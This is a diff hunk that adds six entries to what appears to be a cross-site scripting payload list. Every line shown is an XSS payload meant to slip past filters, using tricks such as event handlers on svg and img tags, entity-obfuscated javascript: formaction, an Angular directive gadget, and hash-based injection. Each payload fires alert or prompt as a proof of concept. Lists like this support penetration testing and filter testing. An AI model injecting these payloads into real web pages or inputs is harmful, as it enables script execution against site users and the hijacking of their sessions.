@@ -1228,3 +1228,9 @@ data:html=1;alert(1)/*,<body%20onload=eval(location.href)><title>*/;alert(2)}
 <%/%=%><p/onresize=alert(1)//>
 <?xml version="1.0" encoding="utf-8" ?><x:script
 xmlns:x="http://www.w3.org/1999/xhtml ">alert(1&#00000041;
+<svg onload=document.writeln(decodeURI(location.hash))>#<img src=onerror=alert(1)>
+<img src=\\?\UNC\\\></style>
+"><input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"
+<script>delete prompt;prompt(1)</script>
+<svg onload = alert('&#x000005cu0031')>
+<x ng-focus=x=$event id=f tabindex=0><x ng-if=[1].map(x.view.alert)>
